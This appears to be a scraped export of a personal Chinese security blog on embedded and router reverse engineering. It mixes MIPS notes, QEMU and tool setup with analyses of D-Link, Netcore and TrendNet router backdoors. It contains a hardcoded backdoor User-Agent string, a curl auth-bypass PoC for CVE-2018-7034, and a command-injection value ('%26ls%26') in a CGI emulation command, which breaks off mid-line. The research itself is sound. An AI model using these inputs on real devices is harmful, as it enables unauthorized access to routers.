可以访问内存\n其他指令都是通过寄存器寻址\nload: lw register_dst ,RAM_src # RAM_source所在的word加载到寄存器中\nlb register_dst ,RAM_src # byte\nli\tregister_dst, value\nstore\nsw register_dst ,RAM_dst # 将寄存器值存到对应内存中\nsb register_source, RAM_dst\n参考链接: https://uweb.engr.arizona.edu/~ece369/Resources/spim/MIPSReference.pdf\n","permalink":"https://chibataiki.github.io/posts/mips-assembly-note/","summary":"特性 MIPS和ARM 一样是RISC精简指令集\n延迟槽 MIPS I 引入了延迟槽机制,以减少各种指令后流水线的阻塞.\nMIPS II 取消了延迟槽机制\nMIPS III 是MIPS II的一个后向兼容的扩展,并支持64位.\nMIPS \u0026hellip;\n指令格式 指令:32bits byte : 8bits word: 4bits, halfword: 2bits\nMIPS架构中, 指令分为三种类型,R型、I型和J型.\n寄存器 Register Number Conventional Name Usage $0 $zero 硬编码为0 $1 $at 保留给汇编器 $2 - $3 $v0, $v1 保存函数返回值 $4 - $7 $a0 - $a3 存储参数 $8 - $15 $t0 - $t7 存储临时数据 $16 - $23 $s0 - $s7 保存寄存器,存储后面用到的数据 $24 - $25 $t8 - $t9 存储临时数据 $26 - $27 $k0 - $k1 为内核保留 $28 $gp 全局指针 $29 $sp 堆栈指针 $30 $fp 保存栈指针 $31 $ra 返回地址 算数指令 opt $dst, $src, [xx] : $dst = $src + [xx]","title":"MIPS汇编note"},{"content":" IDAFuzzy : https://github.com/Ga-ryo/IDAFuzzy 在IDA中,对函数进行模糊搜索不是由友好,所以搜了一下,发现了IDAFuzzy IDA pro 在macOS下安装的坑 和Windows中直接将插件拖到plugin目录不同, macOS的插件安装需要两步\n将ida_fuzzy.py 文件放到 plugins 目录下 将ida_fuzzy.py 所依赖的包放到 python 目录下 可以看到/Applications/IDA Pro 7.0/ida.app/Contents/MacOS中的目录结构:\nchibataiki@chibataikis-MBP MacOS % tree -d -L 1 . . ├── cfg ├── dbgsrv ├── idc ├── ids ├── loaders ├── plugins ├── procs ├── python ├── sig └── til ","permalink":"https://chibataiki.github.io/posts/ida-plugin-install/","summary":" IDAFuzzy : https://github.com/Ga-ryo/IDAFuzzy 在IDA中,对函数进行模糊搜索不是由友好,所以搜了一下,发现了IDAFuzzy IDA pro 在macOS下安装的坑 和Windows中直接将插件拖到plugin目录不同, macOS的插件安装需要两步\n将ida_fuzzy.py 文件放到 plugins 目录下 将ida_fuzzy.py 所依赖的包放到 python 目录下 可以看到/Applications/IDA Pro 7.0/ida.app/Contents/MacOS中的目录结构:\nchibataiki@chibataikis-MBP MacOS % tree -d -L 1 . . ├── cfg ├── dbgsrv ├── idc ├── ids ├── loaders ├── plugins ├── procs ├── python ├── sig └── til ","title":"macOS下IDA插件安装"},{"content":"受漏洞影响的是D-link 路由器的一些型号, 这些固件由D-link 子公司Alpha Networks公司开发.\n只需要将浏览器User-Agent标志修改为：xmlset_roodkcableoj28840ybtide，再访问路由器IP地址，即可无需经过验证访问路由器的Web管理界面修改设备设置。\n该后门在路由器的web服务中实现.\nCraig Heffner 进行分析的时候,就首先将 /bin/webs 拖进IDA进行分析.\n首先查看web server 的型号: thttpd-alphanetworks/2.23应该是thttpd的修改版本,而alphanetworks是D-link的子公司.\nfunctions一栏里面很多alpha开头的函数,里面有个权限检查程序alpha_auth_check,可以分析一下.\n通过交叉引用搜索发现 alpha_httpd_parse_request调用了alpha_auth_check :\nalpha_httpd_parse_request调用部分:\nloc_41A420: move $a0, $s2 la $t9, alpha_auth_check nop jalr $t9 ; alpha_auth_check nop lw $gp, 0x2830+var_2820($sp) li $v1, 0xFFFFFFFF beq $v0, $v1, loc_41A4B0 li $a0, 0xFFFFFFFF 分析一下参数: alpha_auth_check的传入参数$a0在$s2中,而 alpha_auth_check返回值存储在$v0中, 然后 $v0和$v1 (0xFFFFFFFF :-1)会进行比较, 相等就跳转到loc_41A4B0 结束函数.\nalpha_auth_check内:\n存在strstr,strcmp 和以及一个明显的硬编码字符串\n看一下strstr用法:\nNAME strstr, strcasestr - locate a substring DESCRIPTION The strstr() function finds the first occurrence of the substring needle in the string haystack. The terminating null bytes (\u0026#39;\\0\u0026#39;) are not compared. RETURN VALUE These functions return a pointer to the beginning of the located substring, or NULL if the substring is not found. strstr参数: a1分别是\u0026quot;graphic/\u0026ldquo;和\u0026quot;public/\u0026quot;,而a0来自于与0xB8($s0),\n所以这里的操作:\n1.strstr(0xB8($s0),\u0026quot;graphic/\u0026quot;) 2.strstr(0xB8($s0)\u0026quot;public/\u0026quot; ) 3.strcmp(0xD0($s0),\u0026quot;xmlset_roodkcableoj28840ybtide)\n如果strcmp匹配,则直接结束函数,这里就绕过了认证.\n分析传入的字符串\n0xD0($s0) -\u0026gt; httpd_parse_request $s0\n通过搜索0XD0 ,可以追溯到httpd_parse_request内:\nloc_41488C: loc_41488C: la $a1, aNotPermitted # \u0026#34; not permitted.\\n\u0026#34; nop addiu $a1, (aUserAgent - 0x470000) # \u0026#34;User-Agent:\u0026#34; li $a2, 0xB la $t9, strncasecmp nop jalr $t9 ; strncasecmp # $v0 =strncasecmp(a0,a1=\u0026#34;User-Agent:\u0026#34;,a2=0xB) nop lw $gp, 0x48+var_30($sp) bnez $v0, loc_4148EC\t# if($v0!=0)\tjmp loc_4148EC\tmove $a0, $s0 ... addiu $s0, 0xB # $s0 = $s0+0xB move $a0, $s0 # MEM[$a0] = MEM[$s0] la $a1, aNotPermitted # \u0026#34; not permitted.\\n\u0026#34; # load address to a1?? [TODO] nop addiu $a1, (asc_46EC10 - 0x470000) # \u0026#34; \\t\u0026#34; # $a1 = \u0026#34;\\t\u0026#34; la $t9, strspn\tnop jalr $t9 ; strspn # $v0 = strspn(a0,a1) nop lw $gp, 0x48+var_30($sp)\taddu $s0, $v0 # $s0= $s0+ $v0 b loc_4150EC sw $s0, 0xD0($s2) # MEM[$s2+0xD0]:4 = $s0 大概分析了下,如果User-Agent里带有xmlset_roodkcableoj28840ybtide, 那么就可以绕过验证\nshodan 关键词: Server: thttpd-alphanetworks/2.23\nreferer:\nhttp://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/\n","permalink":"https://chibataiki.github.io/posts/dlink-backdoor-analysis/","summary":"受漏洞影响的是D-link 路由器的一些型号, 这些固件由D-link 子公司Alpha Networks公司开发.\n只需要将浏览器User-Agent标志修改为：xmlset_roodkcableoj28840ybtide，再访问路由器IP地址，即可无需经过验证访问路由器的Web管理界面修改设备设置。\n该后门在路由器的web服务中实现.\nCraig Heffner 进行分析的时候,就首先将 /bin/webs 拖进IDA进行分析.\n首先查看web server 的型号: thttpd-alphanetworks/2.23应该是thttpd的修改版本,而alphanetworks是D-link的子公司.\nfunctions一栏里面很多alpha开头的函数,里面有个权限检查程序alpha_auth_check,可以分析一下.\n通过交叉引用搜索发现 alpha_httpd_parse_request调用了alpha_auth_check :\nalpha_httpd_parse_request调用部分:\nloc_41A420: move $a0, $s2 la $t9, alpha_auth_check nop jalr $t9 ; alpha_auth_check nop lw $gp, 0x2830+var_2820($sp) li $v1, 0xFFFFFFFF beq $v0, $v1, loc_41A4B0 li $a0, 0xFFFFFFFF 分析一下参数: alpha_auth_check的传入参数$a0在$s2中,而 alpha_auth_check返回值存储在$v0中, 然后 $v0和$v1 (0xFFFFFFFF :-1)会进行比较, 相等就跳转到loc_41A4B0 结束函数.\nalpha_auth_check内:\n存在strstr,strcmp 和以及一个明显的硬编码字符串\n看一下strstr用法:\nNAME strstr, strcasestr - locate a substring DESCRIPTION The strstr() function finds the first occurrence of the substring needle in the string haystack.","title":"Dlink Backdoor 分析记录"},{"content":"环境\n宿主机: ubuntu 18.04 x86_64 客户机: qemu运行的debian(wheey)\nMIPS/ARM的程序调试方式:\n直接在宿主机上使用qemu 用户模式 在对应架构的debian虚拟机上运行,使用qemu-[mips/arm]-static的调试模式或者gdbserver都行 这里选择第二种\n2.1. 客户机安装qemu-user-static\napt-get install qemu-user-static chroot . ./qemu-[arch]-static [-g port] [program]\n2.2. 客户机安装 gdbserver\nchroot . ./program gdbserver --attach pid 调试工具(宿主机):\nIDA debugger里设置一下就行 gdb-multiatch set architecture mips target remote [ip]:[port] gdb可以使用pwngdb,pedagdb等插件\nreferer:\n","permalink":"https://chibataiki.github.io/posts/dynamic-analysis-for-mips-arm/","summary":"环境\n宿主机: ubuntu 18.04 x86_64 客户机: qemu运行的debian(wheey)\nMIPS/ARM的程序调试方式:\n直接在宿主机上使用qemu 用户模式 在对应架构的debian虚拟机上运行,使用qemu-[mips/arm]-static的调试模式或者gdbserver都行 这里选择第二种\n2.1. 客户机安装qemu-user-static\napt-get install qemu-user-static chroot . ./qemu-[arch]-static [-g port] [program]\n2.2. 客户机安装 gdbserver\nchroot . ./program gdbserver --attach pid 调试工具(宿主机):\nIDA debugger里设置一下就行 gdb-multiatch set architecture mips target remote [ip]:[port] gdb可以使用pwngdb,pedagdb等插件\nreferer:","title":"MIPS/ARM 调试环境"},{"content":"Discovering the world !\n","permalink":"https://chibataiki.github.io/about/","summary":"Discovering the world !","title":"About"},{"content":"之前安装 Burpsuite的时候,使用的是旧版本JDK1.8,这次ghida需要新版本\n在linux中可以使用sudo update-alternatives --config java 进行java版本的选择\nmacOS下则使用jenv\nbrew tap homebrew/cask-versions brew install jenv 显示java 环境\n/usr/libexec/java_home -V 结果类似于\n13.0.2, x86_64:\t\u0026#34;OpenJDK 13.0.2\u0026#34;\t/Library/Java/JavaVirtualMachines/openjdk-13.0.2.jdk/Contents/Home 1.8.0_231, x86_64:\t\u0026#34;Java SE 8\u0026#34;\t/Library/Java/JavaVirtualMachines/jdk1.8.0_231.jdk/Contents/Home 添加 jdk ,路径为就是上面现实的路径\njenv add \u0026lt;jdk_path\u0026gt; 显示java版本信息:\njenv versions jenv version 设置java环境:\njenv global [jdk version] jenv local [jdk version] 有问题可以运行 jenv doctor\nreferer: https://gist.github.com/ntamvl/5f4dbaa8f68e6897b99682a395a44c2e\n","permalink":"https://chibataiki.github.io/posts/macos-multui-java-management/","summary":"之前安装 Burpsuite的时候,使用的是旧版本JDK1.8,这次ghida需要新版本\n在linux中可以使用sudo update-alternatives --config java 进行java版本的选择\nmacOS下则使用jenv\nbrew tap homebrew/cask-versions brew install jenv 显示java 环境\n/usr/libexec/java_home -V 结果类似于\n13.0.2, x86_64:\t\u0026#34;OpenJDK 13.0.2\u0026#34;\t/Library/Java/JavaVirtualMachines/openjdk-13.0.2.jdk/Contents/Home 1.8.0_231, x86_64:\t\u0026#34;Java SE 8\u0026#34;\t/Library/Java/JavaVirtualMachines/jdk1.8.0_231.jdk/Contents/Home 添加 jdk ,路径为就是上面现实的路径\njenv add \u0026lt;jdk_path\u0026gt; 显示java版本信息:\njenv versions jenv version 设置java环境:\njenv global [jdk version] jenv local [jdk version] 有问题可以运行 jenv doctor\nreferer: https://gist.github.com/ntamvl/5f4dbaa8f68e6897b99682a395a44c2e","title":"MacOS 多版本java管理"},{"content":" IDA hopper radare2 ghidra JEB-MIPS ollydbg gdb pwngdb gef peda burpsuite linux command\nfile\nreadelf\nstrings\nobjdump\nhexdump\nstrace\nltrace\nbinwalk\nchecksec\nqemu\ndockerhub： https://hub.docker.com/u/waveburst\n封装了QEMU system模式的arm,mips的docker镜像\n参考链接:\nhttps://reverseengineering.stackexchange.com/questions/1817/is-there-any-disassembler-to-rival-ida-pro\n","permalink":"https://chibataiki.github.io/posts/normal-binary-analysis-tools/","summary":"IDA hopper radare2 ghidra JEB-MIPS ollydbg gdb pwngdb gef peda burpsuite linux command\nfile\nreadelf\nstrings\nobjdump\nhexdump\nstrace\nltrace\nbinwalk\nchecksec\nqemu\ndockerhub： https://hub.docker.com/u/waveburst\n封装了QEMU system模式的arm,mips的docker镜像\n参考链接:\nhttps://reverseengineering.stackexchange.com/questions/1817/is-there-any-disassembler-to-rival-ida-pro","title":"常用的漏洞分析工具note"},{"content":"主要是对MIPS/ARM架构的嵌入式设备进行仿真\n系统仿真在大多数时候并不是一种很好的选择,因为不能保证完美的仿真硬件\n0x00 QEMU 系统模式的仿真方式 系统模式下的引导需要提供内核,文件系统,文件系统使用binwalk等工具可以相对方便的获取, 但是内核比较麻烦. 这里大致有三种系统仿真方式\n1.从设备中提取内核,并将提取出的文件系统制作成镜像,从镜像中启动. 这种方式最接近物理设备但是内核的提取不容易,是否能成功启动也另说.\n2.使用一个同架构(MIPS,ARM)预编译的内核,使用固件提取的文件做成镜像进行启动. 相对容易,但是让仿真成功进行也比较麻烦.\n3.使用一个同架构(MIPS,ARM)预编译的内核,以及预编译的系统镜像. 在系统成功启动后,将固件提取的文件系统拷贝到虚拟机中,使用 chroot 进行允许. 虽然不够贴近物理设备但是比较容易实现\n这里选择第3种.\n0x01 安装qemu sudo apt-get install qemu-system-mips qemu-system-mipsel qemu-system-arm -y (这里需要说一下的就是,直接使用apt 安装的qemub版本是2.x,但是QEMU官网的版本已经是4.x, 里面一些manual 手册内容也发生了变化, 但是还有一种说法就是,最好不要自己编译QEMU,因为可能对某些支持不是很好)\n0x02下载预编译的kernel和系统文件镜像 下载链接: https://people.debian.org/~aurel32/qemu/\n一些默认设置:\nRoot password: root\nUser account: user\nUser password: user\n0x03启动qemu 最基础的命令:\nqemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append \u0026quot;root=/dev/sda1 console=ttyS0\u0026quot; 不想使用图形模式: -nographic\n默认内存128 可以设置 -m 256M\n0x04 网络配置 qemu支持设置usr,tap,bridge,l2tp,socket等类型的网络\n(! net 参数不提倡,QEMU建议使用netdev)\n1.用户模式- SLIRP 不加任何参数时的默认模式就是用户模式\n默认参数为 -net dev, -net nic\n网络如下图所示\n该模式允许客户机(qemu)和宿主机(ubuntu)进行有限的通讯\n-netdev user 中有一些设置参数比如:\nnet, host,dns,tftp,smb等等\n比较有用的是 hostfwd,允许进行数据转发\nhostfwd= [tcp|udp]:[hostaddr]:hostport-[guestaddr]:guestport\n例如宿主机通过ssh访问客户机:\nqemu-system-mipsel -M malta -m 256M -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append \u0026#39;root=/dev/sda1 console=ttyS0\u0026#39; -nographic -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5555-:22 其中-device e1000 创建虚拟网络设备\n-netdev user,id=net0,hostfwd=tcp::5555-:22\n创建user 模式的网络,将客户机所有端口22的数据重定向到宿主机端口5555上面\n在宿主机上ssh客户机就是:\nssh [username]@localhost -p 5555\n其他服务端口的开启类似.\n使用方式比较简单, 但是可用性和性能方面都有很有限.\nTAP\u0026amp; TUN TAP等同于一个以太网设备，它操作第二层数据包(以太网数据帧)。 TUN 模拟了网络层设备,操作第三层数据包(IP数据)\ntap设备比user-mode 有更好的性能\n进行网络设置 先讲一下我的设备环境:\n宿主机: macOS catalina 虚拟机: ubuntu 18.04.4 in VMware ubuntu 网络: 通过VMWare 的NAT接口连接 设置 bridge\n虚拟网桥工具 sudo apt-get install bridge-utils\n开启ipv4转发\nsudo sysctl net.ipv4.ip_forward=1\nqemu-ifup \u0026amp;\u0026amp; qemu-ifdown\n一些教程都是直接在 /network/interfaces 中直接修改的, 感觉方式不够优雅, 因为这些设置不是必须的,只有在仿真的时候才需要.\n所以这里设置一个build-bridge脚本执行网桥的设置和连接,一个recover-nerwork 脚本恢复网络,而qemu-ifup qemu-ifdown 设置tap相关设备(有需要优化的地方,因为有些时候ens33的ip存在没有释放的情况,[TODO])\nbuild-bridge\n# 判是否root 权限 if [ \u0026quot;$(id -u)\u0026quot; != \u0026quot;0\u0026quot; ]; then echo \u0026quot;This script must be run as root\u0026quot; 1\u0026gt;\u0026amp;2 exit 1 fi echo \u0026quot;[!]Start building bridge... \u0026quot; dhclient -r ens33 # 释放ip ip addr flush ens33 # 清除 ip #确认ens3 刷新 ip link set dev ens33 down ip link set dev ens33 up ip link add name br0 type bridge #建立网桥 brctl addif br0 ens33 # 连接ens33 到bridge ip link set dev br0 up dhclient br0 # 从 dhcp 服务器获得 br0 的 IP 地址 ip addr flush ens33 echo \u0026quot;[!] Finisted bridge setting!\u0026quot; recover-bridge\n判断root if [ \u0026quot;$(id -u)\u0026quot; != \u0026quot;0\u0026quot; ]; then echo \u0026quot;This script must be run as root\u0026quot; 1\u0026gt;\u0026amp;2 exit 1 fi echo \u0026quot;[!]Recover network setting ... \u0026quot;\tip link set dev br0 down # 解除连接 brctl delif ens33 br0 # 删除tap 和 br0 ip link delete dev br0 dhclient ens33 sleep 1 ip link set dev ens33 up echo \u0026quot;[!]Finished network setting!\u0026quot; qemu-ifup:\n$ip addr add 0.0.0.0 dev $1 $ip link set dev $1 up $brctl addif br0 $1 qemu-ifdown\nip link set dev $1 down btctl delif br0 $1 ip link delete dev $1 初步网络设置 sudo ./build-bridge.sh\n启动qemu\nsudo qemu-system-mipsel -M malta -m 256M -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append \u0026#39;root=/dev/sda1 console=ttyS0\u0026#39; -nographic -net nic, -net tap 运行完的网络情况: br0和ens33 tap0: qemu虚拟机里网络: 网络测试 Q\u0026amp;A:\nman qemu 中建议使用 netdev ,但是devtype 是什么没说 -net nic[,vlan=n][,macaddr=mac][,model=type][,name=str][,addr=str][,vectors=v] old way to create a new NIC and connect it to VLAN \u0026rsquo;n' (use the \u0026lsquo;-device devtype,netdev=str\u0026rsquo; option if possible instead)\nA: -net nic表示添加设备 可以使用model=xxxx 指定添加设备的类型 https://en.wikibooks.org/wiki/QEMU/Devices/Network\nreferer: https://people.debian.org/~aurel32/qemu/mipsel/README.txt\nhttps://manpages.debian.org/unstable/qemu-system-mips/qemu-system-mips.1.en.html\nhttps://wiki.qemu.org/Documentation/Networking#Tap https://odkq.com/qemukvmtap\n","permalink":"https://chibataiki.github.io/posts/qemu-system-mode-setting/","summary":"主要是对MIPS/ARM架构的嵌入式设备进行仿真\n系统仿真在大多数时候并不是一种很好的选择,因为不能保证完美的仿真硬件\n0x00 QEMU 系统模式的仿真方式 系统模式下的引导需要提供内核,文件系统,文件系统使用binwalk等工具可以相对方便的获取, 但是内核比较麻烦. 这里大致有三种系统仿真方式\n1.从设备中提取内核,并将提取出的文件系统制作成镜像,从镜像中启动. 这种方式最接近物理设备但是内核的提取不容易,是否能成功启动也另说.\n2.使用一个同架构(MIPS,ARM)预编译的内核,使用固件提取的文件做成镜像进行启动. 相对容易,但是让仿真成功进行也比较麻烦.\n3.使用一个同架构(MIPS,ARM)预编译的内核,以及预编译的系统镜像. 在系统成功启动后,将固件提取的文件系统拷贝到虚拟机中,使用 chroot 进行允许. 虽然不够贴近物理设备但是比较容易实现\n这里选择第3种.\n0x01 安装qemu sudo apt-get install qemu-system-mips qemu-system-mipsel qemu-system-arm -y (这里需要说一下的就是,直接使用apt 安装的qemub版本是2.x,但是QEMU官网的版本已经是4.x, 里面一些manual 手册内容也发生了变化, 但是还有一种说法就是,最好不要自己编译QEMU,因为可能对某些支持不是很好)\n0x02下载预编译的kernel和系统文件镜像 下载链接: https://people.debian.org/~aurel32/qemu/\n一些默认设置:\nRoot password: root\nUser account: user\nUser password: user\n0x03启动qemu 最基础的命令:\nqemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append \u0026quot;root=/dev/sda1 console=ttyS0\u0026quot; 不想使用图形模式: -nographic\n默认内存128 可以设置 -m 256M\n0x04 网络配置 qemu支持设置usr,tap,bridge,l2tp,socket等类型的网络\n(! net 参数不提倡,QEMU建议使用netdev)\n1.用户模式- SLIRP 不加任何参数时的默认模式就是用户模式","title":"QEMU system mode emulation"},{"content":"磊科路由器中内置了一个IGDMPTD的程序, 在外网上打开UDP端口53413 并进行监听. 后门采用硬编码的密码,允许攻击者在路由器上执行任意代码.\n知道了这些之后,进行分析\n仿真:\n使用qemu 系统模式作为测试环境\n固件: https://github.com/rapid7/metasploit-framework/files/267284/vuln_squashfs-root.tar.gz\nscp -P 22 vuln_squashfs-root.tar.gz root@[target_ip]:/root tar xvf vuln_squashfs-root.tar.gz cd squashfs-root chroot . ./bin/igdmpt 可以看到端口已经打开 使用poc可以发现确实存在漏洞 create_server 函数中\nbind:\nint bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);` addr =[family][ip][port] = 0xa5d00002\n0xd05a = 53413 :端口号\n0x00 = 0 : ip , INADDR_ANY =0 ,监听所有地址\n0x02 = 2 :sa_family = 2,即SOCK_DGRAM ,表示UDP连接\n这里ip设置为监听所有地址,所以设备会被暴露在公网上,很危险.\n/* Socket types. */ #define SOCK_STREAM\t1\t/* stream (connection) socket\t*/ #define SOCK_DGRAM\t2\t/* datagram (conn.less) socket\t*/ # define INADDR_ANY ((unsigned long int) 0x00000000) ... # define INADDR_NONE 0xffffffff ... # define INPORT_ANY 0 ... 敏感功能:\nPoc脚本:https://github.com/h00die/MSF-Testing-Scripts/blob/master/netis_backdoor.py\n参考链接: https://blog.trendmicro.com/trendlabs-security-intelligence/netis-router-backdoor-patched-but-not-really/ https://blog.knownsec.com/wp-content/uploads/2015/01/NetcoreNetis-%E8%B7%AF%E7%94%B1%E5%99%A8%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5%E6%A6%82%E8%A6%81.pdf https://github.com/h00die/MSF-Testing-Scripts/blob/master/netis_backdoor.py\n","permalink":"https://chibataiki.github.io/posts/netcore_igdmptd_backdoor_analysis/","summary":"磊科路由器中内置了一个IGDMPTD的程序, 在外网上打开UDP端口53413 并进行监听. 后门采用硬编码的密码,允许攻击者在路由器上执行任意代码.\n知道了这些之后,进行分析\n仿真:\n使用qemu 系统模式作为测试环境\n固件: https://github.com/rapid7/metasploit-framework/files/267284/vuln_squashfs-root.tar.gz\nscp -P 22 vuln_squashfs-root.tar.gz root@[target_ip]:/root tar xvf vuln_squashfs-root.tar.gz cd squashfs-root chroot . ./bin/igdmpt 可以看到端口已经打开 使用poc可以发现确实存在漏洞 create_server 函数中\nbind:\nint bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);` addr =[family][ip][port] = 0xa5d00002\n0xd05a = 53413 :端口号\n0x00 = 0 : ip , INADDR_ANY =0 ,监听所有地址\n0x02 = 2 :sa_family = 2,即SOCK_DGRAM ,表示UDP连接\n这里ip设置为监听所有地址,所以设备会被暴露在公网上,很危险.\n/* Socket types. */ #define SOCK_STREAM\t1\t/* stream (connection) socket\t*/ #define SOCK_DGRAM\t2\t/* datagram (conn.","title":"Netcore-igdmptd-后门漏洞分析"},{"content":"环境： macOS catalina vim: macvim\n设置vim初始化环境 mkdir ~/.vim mv .vimrc ~/.vim/vimrc vim的初始化环境在macOS上最初是～/.vimrc, 因为需要安装插件新建了.vim文件夹，所以想将.vimrc文件放入.vim目录下,这个时候需要重命名.vimrc为vimrc. 可以在:h viminfo 中查看 安装插件 这里使用的是vim-plug :https://github.com/junegunn/vim-plug\n需要将\n\u0026quot; Plugins will be downloaded under the specified directory. call plug#begin('~/.vim/plugged') \u0026quot; List ends here. Plugins become visible to Vim after this call. call plug#end() 添加到vimrc中,然后vim下执行:PlugInstall 就可以安装配置中的插件\n安装markdown预览插件 https://github.com/iamcco/markdown-preview.nvim\n在vimrc Plug区域添加\ncall plug#begin('~/.vim/plugged') 预览:\n:MarkdownPreview :MarkdownPreviewStop ","permalink":"https://chibataiki.github.io/posts/vim-markdown-plugin-install/","summary":"环境： macOS catalina vim: macvim\n设置vim初始化环境 mkdir ~/.vim mv .vimrc ~/.vim/vimrc vim的初始化环境在macOS上最初是～/.vimrc, 因为需要安装插件新建了.vim文件夹，所以想将.vimrc文件放入.vim目录下,这个时候需要重命名.vimrc为vimrc. 可以在:h viminfo 中查看 安装插件 这里使用的是vim-plug :https://github.com/junegunn/vim-plug\n需要将\n\u0026quot; Plugins will be downloaded under the specified directory. call plug#begin('~/.vim/plugged') \u0026quot; List ends here. Plugins become visible to Vim after this call. call plug#end() 添加到vimrc中,然后vim下执行:PlugInstall 就可以安装配置中的插件\n安装markdown预览插件 https://github.com/iamcco/markdown-preview.nvim\n在vimrc Plug区域添加\ncall plug#begin('~/.vim/plugged') 预览:\n:MarkdownPreview :MarkdownPreviewStop ","title":"Vim-Markdown-插件安装"},{"content":"因为有时候英文视频没有字幕，所以需要将视频的音频输出转为输入，这样可以借助一些翻译工具进行翻译。\n工具： Soundflower\n安装 https://github.com/mattingalls/Soundflower/releases\n打开audio midi setup create Multi-Output Device，选中 Build-in Output 和SoundFlower(2ch), 此时，sound中的Output就多了Multi-Output Device 项\nchrome 浏览器下，translate.google.com 地址栏右侧microphone 设置可以选择 Internal-Microphone(Build-in)，以及Soundflower(2ch),此时 谷歌页面输入的声音就是此时电脑输出的声音\nreferer: https://github.com/mattingalls/Soundflower/releases\n","permalink":"https://chibataiki.github.io/posts/macos_catalina_sound_redirection/","summary":"因为有时候英文视频没有字幕，所以需要将视频的音频输出转为输入，这样可以借助一些翻译工具进行翻译。\n工具： Soundflower\n安装 https://github.com/mattingalls/Soundflower/releases\n打开audio midi setup create Multi-Output Device，选中 Build-in Output 和SoundFlower(2ch), 此时，sound中的Output就多了Multi-Output Device 项\nchrome 浏览器下，translate.google.com 地址栏右侧microphone 设置可以选择 Internal-Microphone(Build-in)，以及Soundflower(2ch),此时 谷歌页面输入的声音就是此时电脑输出的声音\nreferer: https://github.com/mattingalls/Soundflower/releases","title":"macOS soundflower audio input-output"},{"content":"TrendNet TEW-751DR CVE-2018-7034 分析\n基本信息 漏洞类型：认证绕过 CVE-ID: CVE-2018-7034 主要影响版本： •\tTEW-751DR – v1.03B03 •\tTEW-752DRU – v1.03B01 •\tTEW733GR – v1.03B01\nPoC curl -d \u0026#34;SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1\u0026#34; \u0026#34;http://[IP]/getcfg.php\u0026#34; 除了可以获取 DEVICE.ACCOUNT的信息外，还可以获取其他信息，只要位于 htdocs/webinc/getcfg中的模块都行。\n漏洞细节 当有Admin用户登录 TrendNet 路由器*,*会触发全局变量 $AUTHORIZED_GROUP \u0026gt;= 1\n攻击者可以注入 AUTHORIZED_GROUP 全局变量绕过phpcgi模块中的认证.\n刚进入 phpcgi_main 后， 会对参数进行键值对形式的存储,（_TYPE_KEY=VALUE，TYPE 为 GET、POST、SERVER）,并且添加 \\n 作为间隔符.\n然后进行认证检测，将检查出的值赋给AUTHORIZED_GROUP，并保存到字符串中作为全局变量传递给 php\nxmldbc_ephp(0, 0, $v0, stdout)\n整个流程中没有对 \\n 进行过滤，通过注入 \\n 进而注入 AUTHORIZED_GROUP 就可以绕过认证检查，绕过授权执行 php 脚本。\n/htdocs/web/getcfg.php\n通过认证后，获取 $_POST[“SERVICES”] , 然后拼接到file 字段，\nReferer:\nhttps://blogs.securiteam.com/index.php/archives/3627#more-3627\nhttp://blog.topsec.com.cn/ad_lab/trendnet%E8%B7%AF%E7%94%B1%E5%99%A8%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/\n","permalink":"https://chibataiki.github.io/posts/cve-2018-7034_analysis/","summary":"TrendNet TEW-751DR CVE-2018-7034 分析\n基本信息 漏洞类型：认证绕过 CVE-ID: CVE-2018-7034 主要影响版本： •\tTEW-751DR – v1.03B03 •\tTEW-752DRU – v1.03B01 •\tTEW733GR – v1.03B01\nPoC curl -d \u0026#34;SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1\u0026#34; \u0026#34;http://[IP]/getcfg.php\u0026#34; 除了可以获取 DEVICE.ACCOUNT的信息外，还可以获取其他信息，只要位于 htdocs/webinc/getcfg中的模块都行。\n漏洞细节 当有Admin用户登录 TrendNet 路由器*,*会触发全局变量 $AUTHORIZED_GROUP \u0026gt;= 1\n攻击者可以注入 AUTHORIZED_GROUP 全局变量绕过phpcgi模块中的认证.\n刚进入 phpcgi_main 后， 会对参数进行键值对形式的存储,（_TYPE_KEY=VALUE，TYPE 为 GET、POST、SERVER）,并且添加 \\n 作为间隔符.\n然后进行认证检测，将检查出的值赋给AUTHORIZED_GROUP，并保存到字符串中作为全局变量传递给 php\nxmldbc_ephp(0, 0, $v0, stdout)\n整个流程中没有对 \\n 进行过滤，通过注入 \\n 进而注入 AUTHORIZED_GROUP 就可以绕过认证检查，绕过授权执行 php 脚本。\n/htdocs/web/getcfg.php\n通过认证后，获取 $_POST[“SERVICES”] , 然后拼接到file 字段，\nReferer:\nhttps://blogs.securiteam.com/index.php/archives/3627#more-3627","title":"CVE-2018-7034_analysis"},{"content":"环境:\nx64 架构kali 2 + qemu user mode mipsel 架构 debian 过程:\n使用IDA 打开 cgibin，main函数里第一步是把argc[0]和各个cgi模块名进行cmp操作， 然后根据 cmp结果进入各个模块。\n可以使用 -0 argv0 强制将目标的 argv[0] 设置为 argv0\ncgi 脚本通常通过环境变量/标准输入 获取输入，为了单独运行CGI脚本， 需要构造 相对应的请求参数。\n# REQUEST_METHOD # cgibin_parse_request 中 获取以下参数: CONTENT_TYPE CONTENT_LENGTH REQUEST_URL\nCONTENT_LENGTH 基于POST 数据的长度\n可以看到请求为GET和POST请求都需要经过认证。\n然后从环境变量中获取三个参数: EVENT，ACTION，SERVICE\nQEMU可以通过 -E 设置环境变量 -0 设置参数\nchroot . ./qemu-mipsel-static -0 \u0026#34;service.cgi\u0026#34; -E REQUEST_METHOD=\u0026#34;POST\u0026#34; - E REQUEST_URI=\u0026#34;service.cgi\\?EVENT=CHECKFW%26ls%26\u0026#34; -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=\u0026#34;application/x-www-form- urlencoded\u0026#34; -E 